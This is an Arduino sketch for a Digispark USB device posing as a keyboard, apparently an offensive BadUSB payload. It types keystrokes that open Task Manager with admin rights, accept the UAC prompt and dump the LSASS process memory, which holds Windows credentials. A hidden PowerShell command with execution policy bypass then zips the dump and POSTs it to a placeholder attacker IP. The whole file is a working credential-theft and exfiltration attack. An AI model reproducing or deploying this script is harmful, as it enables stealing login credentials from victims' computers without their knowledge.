#include "DigiKeyboard.h"

#define KEY_ARROW_DOWN 0x51

void setup() {
    /* Open the Windows Run Prompt */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    /* Open Task Manager */
    DigiKeyboard.print("taskmgr");
    DigiKeyboard.delay(500);
    /* The Task Manager is executed with administrative priviledges. */
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(2500);
    /* Bypass the UAC */
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(5000);
    /* Move to the list of active background processes */
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    /* Jump to Local Security Authority Service */
    DigiKeyboard.print("local");
    /* Invoke the right-click options */
    DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1200);
    /* Highlight the Create Dump file option */
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    /* Select Create dump file. It will be saved to the %TEMP% directory */
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3500);
    /* Close the dump popup window */
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    /* Close the Task Manager window */
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(700);
    /* Open the Windows Run Prompt */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(700);
    /* A hidden powershell terminal is launched with ExecutionPolicy bypass to bypass antivirus restrictions.
       The temporary directory is set to $t variable and the lsass.DMP file name is set to the variable $l.
       Finally the lsass.DMP file is compressed to the a.zip file and send to the attacker's server with a POST request. */
    DigiKeyboard.print("powershell -ep bypass /w 1 /C $t=$env:temp;$l='lsass.DMP';compress-archive -path $t\$l -destinationpath $t\a.zip;iwr <attacker's-ip>/i.php -method POST -infile $t\a.zip");
    /* Execute the command */
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}